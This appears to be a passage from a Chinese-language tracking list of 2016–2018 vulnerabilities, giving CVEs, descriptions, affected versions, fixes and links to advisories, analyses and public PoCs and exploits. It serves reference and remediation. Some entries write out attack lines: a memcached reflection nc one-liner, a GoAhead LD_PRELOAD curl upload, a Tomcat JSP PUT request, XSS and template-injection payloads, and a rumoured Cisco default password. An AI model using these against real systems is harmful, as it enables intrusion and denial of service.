    - MSF模块：<https://packetstormsecurity.com/files/148878/weblogic_deserialize.rb.txt>

1. **【20180410】SpringDataCommons RCE漏洞 CVE-2018-1270**
    - 漏洞公告：<https://pivotal.io/security/cve-2018-1273>
    - 漏洞分析：<https://xz.aliyun.com/t/2269><https://mp.weixin.qq.com/s/bIY0PHvQEbNT2inhS5dZwg>

1. **【20180406】SpringMessaging RCE漏洞 CVE-2018-1270**
    - 描述：SPEL表达式注入。使用spring-messaging模块开放的STOMP协议的Websocket Broker服务存在漏洞。
    - 分析复现：<https://xz.aliyun.com/t/2252>
    - 官方公告：<https://pivotal.io/security/cve-2018-1270>
    - 修复：需更新Spring框架到5.0.5、4.3.16及以上（4.3.15版本未修复，需要升级到4.3.16版本及以上）
    - 补丁绕过：<https://pivotal.io/security/cve-2018-1275>

1. **【20180328】Drupal代码执行漏洞（CVE-2018-7600）**
    - PoC：https://github.com/dreadlocked/Drupalgeddon2/blob/master/drupalgeddon2.rb
    - 描述：Drupal 使用 # 开头的变量作为内部表达式使用的变量，但未考虑到用户请求中可构造该类型变量，在多个函数调用中可能导致任意代码执行漏洞。
    - 影响：小于 7.58 的所有 7.* 版本、小于 8.5.1 的所有 8.* 版本、已停止维护的 6.* 版本
    - 修复：7.* 升级到 7.58 https://www.drupal.org/project/drupal/releases/7.58
    - 修复：8.* 升级到 8.5.1 https://www.drupal.org/project/drupal/releases/8.5.1
    - 修复：6.* 和 8.3、8.4 已经停止维护，建议升级到 8.5.1 或 7.5.8
    - 公告：<https://www.drupal.org/sa-core-2018-002>

1. **【20180406】Windows提权 TotalMeltdown** 
    - WindowsCPU补丁导致一个新的提权漏洞

1. **【20180330】思科Cisco SmartInstallClient缓冲区溢出漏洞及多个严重漏洞CVE-2018-0171,默认口令CVE-2018-0150**
    - 漏洞发现者博客：<https://embedi.com/blog/cisco-smart-install-remote-code-execution/>
    - 思科安全公告：<https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2>
    - 长亭预警：<http://mp.weixin.qq.com/s/6KmpLlnsyiTKGu6GkCmXDg>
    - 同程预警：<http://mp.weixin.qq.com/s/cMYUuGFmox5PK89fO_eR8w>
    - 探测PoC：<https://github.com/Cisco-Talos/smi_check/blob/master/smi_check.py>
    - 协议特征：<https://github.com/rapid7/metasploit-framework/commit/c67e407c9c5cd28d555e1c2614776e05b628749d>
    - Exploit: <https://github.com/Sab0tag3d/SIET>
    - 另外还有一个默认口令的漏洞：<https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-xesc> 据说是 cisco/$un7zu

    
1. **【20180329】Drupal核心远程代码执行**
    - 漏洞预警: [Drupalgeddon2-Drupal核心远程代码执行](http://mp.weixin.qq.com/s/xKwxtq4hBCRA976abfX6Xw)
    - PoC: 暂无

1. **【20180316】Ubuntu1604提权漏洞, 漏洞相关: CVE-2017-16995**
    - 讨论: <https://news.ycombinator.com/item?id=16597800>
    - 描述: 2017年12月，Google P0团队发现4.14分支以后eBPF存在漏洞<https://www.cvedetails.com/cve/CVE-2017-16995/>。内核主线4.14之后版本都已经修复漏洞，但4.4分支也存在类似漏洞未修复。
    - Exploit: <http://cyseclabs.com/exploits/upstream44.c>
    - 相关历史漏洞的修复: <https://github.com/torvalds/linux/commit/95a762e2c8c942780948091f8f2a4f32fce1ac6f>
    - 相关历史漏洞: https://bugs.chromium.org/p/project-zero/issues/detail?id=1454&desc=3
    - 触发条件: 
        1. CONFIG_BPF_SYSCALL 打开,可以调用bpf syscall 
        2. /proc/sys/kernel/unprivileged_bpf_disabled 设置为0
    - 漏洞分析: <https://mp.weixin.qq.com/s/PgyKiEpGzNJFX6FwmJcR0A>
    - 漏洞分析: <https://xianzhi.aliyun.com/forum/topic/2212>
    - 修复: 
    echo "deb http://archive.ubuntu.com/ubuntu/  xenial-proposed restricted main multiverse universe" > /etc/apt/sources.list && apt update && apt install linux-image-4.4.0-117-generic


1. **【20180315】CredSSP MS-RDP漏洞？**
    - 漏洞分析：<https://mp.weixin.qq.com/s/7tKZeY23otlNLk7tJv-lfQ>

1. **【20180307】Adobe Acrobat ReaderPDF远程代码执行漏洞**
    - 新闻稿: <https://www.secpulse.com/archives/69147.html>
    - 漏洞分析: <https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0505>
    - 漏洞预警: <https://cert.360.cn/warning/detail?id=33ec6051c0ca499106a3aa6168d853f5>

1. **【20180301】Memcache DDoS反射放大攻击**
    - 安全预警：https://cert.360.cn/warning/detail?id=c63eb87058834e37c7c112c35ef5f9fd
    - 漏洞分析：基于Memcached分布式系统DRDoS拒绝服务攻击技术研究<http://blog.csdn.net/microzone/article/details/79262549>
    - 漏洞描述：利用memcache 11211端口作为DRDoS放大器，可将流量放大五万倍左右。向未鉴权的Memcache中插入大量数据，并伪造源IP进行读取操作，从而进行反射放大攻击。
    - 相关报道：https://thehackernews.com/2018/03/biggest-ddos-attack-github.html
    - PoC: python -c "print '\0\x01\0\0\0\x01\0\0stats\r\n'"|nc -nvvu x.x.x.x 11211 >/tmp/null
    - PoC: <https://github.com/kxcode/snippet/blob/master/memcache-reflect.txt>


1. **【20180201】Adobe Flash 缓冲区溢出漏洞 CVE-2018-4878**
    - 描述：2月1日，Adobe官方发布了Adobe Flash Player系列产品的安全通告（APSA18-01），一个最新的Adobe Flash零日漏洞被发现针对韩国地区的人员发起攻击，该0day漏洞编号为CVE-2018-4878，目前最新版本28.0.0.137及其以前版本的Adobe Flash Player均受漏洞影响，Adobe官方将于2月5日发布漏洞补丁
    - CVE: CVE-2018-4878
    - PoC: <https://github.com/vysec/CVE-2018-4878>
    - PoC: <https://github.com/anbai-inc/CVE-2018-4878>
    - 分析报告: <https://mp.weixin.qq.com/s/zJm-mr5-U5sBHdc3Qlx_3Q>
    - 相关报道: [CVE-2018-4878 (Flash Player up to 28.0.0.137) and Exploit Kits](https://malware.dontneedcoffee.com/2018/03/CVE-2018-4878.html)

1. **【201802】Wordpress全版本DoS漏洞**
    - CVE-2018-6389
    - 漏洞影响范围: 全版本，官方没有发补丁
    - 漏洞描述：漏洞是一个应用程序级别的 DoS攻击问题，该漏洞出现在load-scripts.php文件中，load-scripts.php文件是为WordPress管理员设计的，允许将多个JavaScript文件加载到一个请求中，通过技术分析发现可以在登录之前调用该函数来允许任何人调用它，并通过少量请求返回大数据，造成服务器资源消耗，从而导致DoS攻击。
    - PoC: <https://github.com/WazeHell/CVE-2018-6389/blob/master/CVE-2018-6389.py>
    - PoC: CC攻击这个URL，<https://example.com/wp-admin/load-scripts.php?c=1&load[]=jquery-ui-core&ver=4.9.1>
        
        load[]参数可以填如下值：eutil,common,wp-a11y,sack,quicktag,....(可参考github上的PoC)

    


1. **【20180128】PHP的GD库DoS漏洞**
    - 分析文章：<https://www.toutiao.com/i6514551846428738055/>
    - 漏洞信息：<https://nvd.nist.gov/vuln/detail/CVE-2018-5711>
    - 漏洞信息：<https://bugs.php.net/bug.php?id=75571>
    - 影响范围：PHP 5< PHP 5.6.33, PHP 7.0<PHP 7.0.27, PHP 7.1<PHP 7.1.13, PHP 7.2<PHP 7.2.1
    - 测试文章：<https://m.toutiao.com/i6514551846428738055/>

1. **【20180124】Electron 命令执行**
    

1. **【20180101】谷歌发现暴雪DNS Rebind漏洞**


1. **【20180124】SmartyPHP模板引擎命令执行RCE漏洞**
    - 分析文章：<https://xianzhi.aliyun.com/forum/topic/1983>
    - 组件指纹：smarty_internal_runtime_codeframe.php 存在这个文件说明使用smarty
    - 修复判断：如果文件内容没有`str_replace('*/','* /',$_template->source->filepath)`说明没有修复
    - 扫描用例：`http://smart-y.teaser.insomnihack.ch/console.php?id=*/phpinfo();/*`

1. **【20180123】Office命令执行漏洞 CVE-2018-0802**
    - 描述：CVE-2017-11882补丁的绕过
    - 分析：<http://www.freebuf.com/vuls/160386.html>

1. **【20180118】Libc Realpath缓冲区溢出漏洞（CVE-2018-1000001），Linux提权漏洞**
    - 影响范围：影响Redhat、Debian、Ubuntu、Suse等Linux发行版本，理论上Linux内核版本大于或等于2.6.36均受影响
    - 参考文章：<https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/>
    - 参考文章：<https://mp.weixin.qq.com/s/x69eDc8ke0wcUcwRdhsk4Q>
    - PoC: <https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c>

1. **【20180104】Intel等CPU存在边信道内存泄露漏洞: Meltdoan,Spectre**
    - Meltdown攻击: CVE-2017-5753、CVE-2017-5715
    - Spectre攻击: CVE-2017-5754
    - 安天分析报告: [处理器A级漏洞Meltdown(熔毁)和Spectre(幽灵)分析](http://mp.weixin.qq.com/s/2FvvFUT8taRPv6GOHzNW-g)
    - 官方Paper: <https://spectreattack.com/spectre.pdf>
    - 官方Paper: <https://meltdownattack.com/meltdown.pdf>
    - 官方博客: <https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html>
    - PoC: <https://github.com/turbo/KPTI-PoC-Collection>
    - PoC: <https://github.com/Eugnis/spectre-attack>
    - PoC: <https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6#file-spectre-c>
    - 各厂商公告汇总: <https://isc.sans.edu/diary/23193>
    - 各厂商补丁地址: <https://github.com/hannob/meltdownspectre-patches>
    - 微软补丁: <https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV180002>
    - 微软补丁: <https://portal.msrc.microsoft.com/zh-cn/security-guidance/releasenotedetail/858123b8-25ca-e711-a957-000d3a33cf99>
    - Xen公告: <http://xenbits.xen.org/xsa/advisory-254.html?from=timeline>
    - 补丁后续: [Azure虚拟机打上Meltdown补丁更新后，真的被搞瘫痪了！](http://mp.weixin.qq.com/s/d7-Cc3qll1zmYKMg3tfYZQ)
    - 相关文章: [Intel回应CPU内核漏洞：别只盯着我们! ARM中枪，AMD躺枪](http://url.cn/5ZWO3g5)
    - 在线监测：http://xlab.tencent.com/special/spectre/spectre_check.html
    - 缓解措施：http://mp.weixin.qq.com/s/Bdc58fRJO4nFzCHnO5WIYQ
    - 后续报道：<http://www.freebuf.com/news/160854.html>

2017
---
1. **【20171222】Weblogic WLS组件 XMLDecoder反序列化漏洞 CVE-2017-10271**
    - 近期Weblogic的一个RCE漏洞在野被爆发式利用，多用于植入挖矿程序。
    - [近期大量WebLogic主机感染挖矿病毒](https://open.work.weixin.qq.com/wwopen/mpnews?mixuin=3_HVCQAABwBuIkeyAAAUAA&mfid=WW0322-Jy56dgAABwC3hf2NINzB1w1SNvc1c&idx=0&sn=55e0f6343b34c62e1980af706e491188&from=singlemessage&isappinstalled=0)
    - 分析：<https://www.ren-isac.net/public-resources/alerts/REN-ISAC_ADVISORY_Oracle_WebLogic_Vulnerability_Bitcoin_Miner_Attacks_20180105v1.pdf >
    - <https://x.threatbook.cn/nodev4/vb4/waparticle?threatInfoID=271>
    - 官方补丁公告：[Oracle 201710重要安全公告](http://www.oracle.com/technetwork/cn/topics/security/cpuoct2017-3236626-zhs.html)
    - XMLDecoder反序列化漏洞是一个历史漏洞，PoC：<https://github.com/pwntester/XMLDecoder>
    - Weblogic wls-wsat 包中也存在这个反序列化漏洞，PoC：<https://github.com/kxcode/snippet/blob/master/Weblogic-CVE-2017-10271.txt>

1. **【20171219】GoAhead服务器CGI存在LD_PRELOAD命令执行漏洞 CVE-2017-17562**
    - 影响范围：3.6.5以下版本的GoAhead，开启CGI脚本支持
    - 漏洞描述：在初始化CGI脚本环境时，未限制用户参数中的环境变量名。该漏洞将影响所有开启了CGI脚本支持（动态链接可执行脚本文件）的GoAhead服务。通过传入恶意的LD_PRELOAD变量可以Hook服务器端的共享函数库，执行恶意动态链接对象。而且launchCgi方法会使用dup2()来处理stdin文件描述符，而它指向的是一个包含了POST请求body内容的临时文件。而Linux procfs文件系统的符号链接可以帮助我们直接引用stdin描述符，而它指向的就是我们所要找的临时文件。这样我们可以在Post Body中传入恶意Payload和相关构造器，来远程利用这个漏洞。
    - PoC：curl -X POST --data-binary @payload.so http://makemyday/cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0 -i 
    - 漏洞分析：<http://mp.weixin.qq.com/s/fDR1tVvMJwXTeOWphUQl1Q>
    - 漏洞分析：<http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4282.html>


1. **【20171211】 Apache Synapse反序列化命令执行漏洞**
    - ApacheSynapse 3.0.1之前的版本使用了CommonsCollection-3.2.1类库，受到CommonsCollection的反序列化漏洞影响，存在命令执行漏洞
    - <https://mp.weixin.qq.com/s/RTRJcbkShIFiQlli_cF8Og>
    - 默认漏洞端口：1099，HTTP RMI服务
    - 漏洞版本下载：<http://synapse.apache.org/download.html>
    - POC: <https://github.com/kxcode/snippet/blob/master/Synapse-Deserial>

1. **【20171130】大脏牛漏洞 - Linux提权**
    - PoC：<https://github.com/bindecy/HugeDirtyCowPOC>
    - <https://medium.com/bindecy/huge-dirty-cow-cve-2017-1000405-110eca132de0>
    - <https://www.seebug.org/vuldb/ssvid-96908>
    - 影响Linux内核2.6.38~4.14

1. **【20171127】Office Word命令执行漏洞 CVE-2017-11882**
    - 2017年11月14日，微软发布了11月的安全补丁更新，其中CVE-2017-11882是一个远程执行漏洞，通杀目前市面上的所有office版本及Windows操作系统(包括刚刚停止支持的Office 2007)。该漏洞的成因是EQNEDT32.EXE进程在读入包含MathType的ole数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个非常经典的栈溢出漏洞。
    - 漏洞分析：<http://bobao.360.cn/learning/detail/4753.html>
    - 利用程序：<https://github.com/embedi/CVE-2017-11882>


1. **【20171116】CouchDB远程代码执行漏洞 - 参数污染加管理员**
    - 官方公告：<https://blog.couchdb.org/2017/11/14/apache-couchdb-cve-2017-12635-and-cve-2017-12636/>
    - 漏洞博客：<https://justi.cz/security/2017/11/14/couchdb-rce-npm.html>
    - 安全版本：2.1.1、1.7.0/1.7.1
    - CVE-2017-12635、CVE-2017-12636
    - 相关历史漏洞：利用query server配置项执行命令 <https://www.seebug.org/vuldb/ssvid-91597>


1. **【20171020】Discuz竞价排行XSS漏洞**

    - /misc.php?mod=ranklist&type=member 添加上榜宣言 `<img src=1 onerror=alert(1)>`
    - /misc.php?mod=ranklist&type=index 鼠标移动到当前用户头像处，触发XSS漏洞
    - 补丁：[https://gitee.com/ComsenzDiscuz/DiscuzX/](https://gitee.com/ComsenzDiscuz/DiscuzX/commit/f6b096a5b6fb9a6f7f6f8276567433488edaa597)


1. **【20171019】Apache Solr 7.0.1 - XML External Entity Expansion / Remote Code Execution**
    
    - Exploit：<https://www.exploit-db.com/exploits/43009/>
    - <http://seclists.org/oss-sec/2017/q4/79>
    - <http://lucene.apache.org/solr/news.html>
    - 安全版本：6.6.2、7.1.0  


1. **【20170929】Discuz!X任意文件删除漏洞**
    
    - 补丁：[https://gitee.com](https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574)
    - 影响：Discuz! X2.5、X3.2、X3.3、X3.4


1. **【20170928】Spring Data Rest远程代码执行漏洞**

    - 分析：<https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA>
    - 修复：<https://github.com/spring-projects/spring-data-rest/releases/tag/2.6.7.RELEASE>


1. **【20170920】Tomcat绕过安全限制PUT上传JSP文件，导致远程代码执行**
    
    - 分析：<https://paper.seebug.org/399/>
    - <https://mailinglist-archive.mojah.be/varia-announce/2017-09/msg00013.php>
    - <http://tomcat.apache.org/security-7.html#Apache_Tomcat_7.x_vulnerabilities>
    - 影响：7.0.0~7.0.81
    - 利用：PUT /evil.jsp/ HTTP/1.1


1. **【20170920】Wordpress SQLi、XSS等高危漏洞修复**

    - <https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/>
    - <http://toutiao.secjia.com/wordpress-4-8-1-xss>


1. **【20170919】Apache Optionsbleed漏洞**
    
    - <https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html>
    - <http://www.freebuf.com/vuls/148525.html>
    - 补丁：[2.4.x](https://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/server/core.c?r1=1805223&r2=1807754&pathrev=1807754&view=patch) 、 [2.2.x](https://blog.fuzzing-project.org/uploads/apache-2.2-optionsbleed-backport.patch)
    - <http://www.apache.org/dist/httpd/CHANGES_2.4>
    - 安全版本：2.4.28


1. **【20170908】 S2-053 Struts2 Freemarker标签远程代码执行**

    - https://cwiki.apache.org/confluence/display/WW/S2-053


1. **【20170907】S2-052 Struts2 Rest插件反序列化命令执行漏洞**

    - https://cwiki.apache.org/confluence/display/WW/S2-052
    - 分析：提交XML格式的恶意请求进行利用。
    - 安全版本：2.3.34、2.5.13

1. **【20170809】Office任意代码执行 CVE-2017-0199**
    -  在野利用：<http://www.freebuf.com/news/143585.html>

1. **【20170613】CVE-2017-8464 Windows快捷方式任意代码执行漏洞**
    - 描述：本地用户或远程攻击者可以利用该漏洞生成特制的快捷方式，并通过可移动设备或者远程共享的方式导致远程代码执行。
    - 利用条件：需要U盘自动播放才能发挥效果
    - 影响范围：
    Windows 7
    Windows 8.1
    Windows RT 8.1
    Windows 10
    Windows Server 2008
    Windows Server 2008 R2
    Windows Server 2012
    Windows Server 2012 R2
    Windows Server 2016
    - 漏洞文章: <http://www.freebuf.com/news/143356.html>

1. **【20170512】永恒之蓝漏洞 MS17-010 CVE-2017-0144**
    - 描述：SMB远程命令执行漏洞。微软已于2017年3月14日发布MS17-010补丁，修复了“永恒之蓝”攻击的系统漏洞。
    - PoC: <https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py>
    - NSA后门doublepulsar检测工具<https://github.com/countercept/doublepulsar-detection-script>
    - 影响范围：Windows 2003、Windows 2003 R2、Windows XP、Windows Vista、Windows 7、Windows 8.1、Windows 10、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 、 Windows Server 2012 R2、Windows Server 2016

1. **【20170418】Fastjson反序列化漏洞**
    - <http://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/>
    - <https://lazydog.me/post/fastjson-JdbcRowSetImpl-rce-exploit.html>
    - 漏洞利用绕过：<http://xia0yu.win/java/34.html>

1. **【20170401】Supervisord RPC服务端RCE漏洞（需认证）**
    - The XML-RPC server in supervisor before 3.0.1, 3.1.x before 3.1.4, 3.2.x before 3.2.4, and 3.3.x before 3.3.3 allows remote authenticated users to execute arbitrary commands via a crafted XML-RPC request, related to nested supervisord namespace lookups.
    - <https://www.exploit-db.com/exploits/42779/>
    - <https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html>
    - CVE-2017-11610
    - POC: <https://github.com/kxcode/snippet/blob/master/Supervisord-RCE>

2016
---
1. **【201610】DirtyCow脏牛提权漏洞CVE-2016-5195**
    - 影响范围：Linux 内核 >=2.6.22（2007 年发行）开始就受影响了，直到 2016 年 10 月 18 日才修复。
    - PoC: <https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs>
    - <https://dirtycow.ninja/>
    - 影响范围<https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails>
    - 影响范围<https://github.com/kcgthb/RHEL6.x-COW>

1. **【20160718】Shiro 1.2.4反序列化命令执行漏洞**
    - 描述：Cookie中rememberMe字段使用硬编码的AES加密，并且会被反序列化。所以可以被篡改为反序列化Gadget进行命令执行。
    - 漏洞利用：需要根据目标的环境选择相应的Gadget，目标环境如有`"commons-collections4:4.0"`的漏洞类库，则可以用ysoserial的`CommonsCollections2` payload直接打。但是如果目标环境是`"commons-collections:3.1、3.2.1"`类库的话，必须用JRMPClient中转一下，攻击者服务器监听JRMPListener再用`CommonsCollection6`等payload打。
    - 利用分析：对于commons-collections3.2.1环境，如果直接打commonscollection的payload，会报错：
    java.lang.ClassNotFoundException: Unable to load ObjectStreamClass \[\[Lorg.apache.commons.collections.Transformer;\:
    static final long serialVersionUID = -4803604734341277543L;\]\:
    报错的原因是因为：Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。
    - 漏洞分析：直接利用CommonsCollection执行 <https://paper.seebug.org/shiro-rememberme-1-2-4/>
    - 漏洞分析：利用JRMPListener执行 <http://www.yilan.io/article/5b4dce6512d8c64b05ffd540>
    - 官方issue：<https://issues.apache.org/jira/browse/SHIRO-550>
    - 漏洞延伸：<https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw>
